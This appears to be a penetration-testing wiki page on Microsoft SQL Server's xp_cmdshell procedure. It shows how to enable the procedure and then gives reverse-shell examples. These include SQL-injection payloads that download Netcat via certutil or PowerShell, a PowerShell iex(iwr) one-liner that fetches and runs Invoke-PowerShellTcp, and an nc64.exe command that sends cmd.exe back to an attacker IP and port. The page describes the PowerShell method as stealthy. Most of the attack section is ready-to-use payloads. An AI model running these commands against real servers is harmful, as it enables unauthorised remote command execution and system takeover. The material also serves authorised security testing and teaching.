---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# xp\_cmdshell

`xp_cmdshell` is an extended stored procedure provided by Microsoft SQL Server that allows system administrators to execute operating system commands directly from within an SQL query. It is disabled by default due to its powerful and potentially dangerous capabilities, but if enabled, it can be leveraged to execute arbitrary commands on the server's operating system.

To use `xp_cmdshell` for executing operating system commands, an attacker or a privileged user must first ensure it is enabled. Here’s a brief outline of how it can be enabled and used:

1.  **Enable `xp_cmdshell`:**

    ```sql
    -- Enable advanced options
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    -- Enable xp_cmdshell
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```
2.  **Execute Commands:** Once enabled, you can execute commands directly from an SQL query:

    ```sql
    EXEC xp_cmdshell 'dir C:\\';  -- Lists directory contents of C:\
    ```

By enabling and using `xp_cmdshell`, users can perform file operations, access network information, and even connect to external systems from the SQL Server environment. However, because of its potential for misuse, it should be handled with extreme caution and ideally, its usage should be restricted and closely monitored.



#### Reverse Shell Examples

After enabling `xp_cmdshell`, you can download and execute Netcat on the target machine. Here are several examples illustrating this process:

**Example 1:**

Download and execute a Netcat executable:

```sql
EXEC xp_cmdshell "certutil -urlcache -f http://example.com/nc64.exe c:/windows/temp/nc64.exe";
```

**Example 2:**

Execute a PowerShell script to establish a reverse shell, which is generally more stealthy and effective:

```powershell
powershell.exe -c iex(iwr http://[IP]:[Port]/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [Port]
```

This method leaves fewer traces and works most of the time.

**Example 3:**

Chain SQL and PowerShell commands to fetch and execute Netcat, facilitating a reverse shell connection:

```sql
';EXECUTE xp_cmdshell 'powershell "Invoke-WebRequest -Uri https://github.com/int0x33/nc.exe/raw/master/nc64.exe -OutFile C:/windows/temp/nc64.exe"';-- and ';EXECUTE xp_cmdshell 'C:\windows\temp\nc64.exe 192.168.1.2 4444 -e cmd.exe';--
```

These examples showcase various techniques for executing remote shells through SQL injection vulnerabilities, demonstrating the critical importance of securing SQL servers against unauthorized command execution.
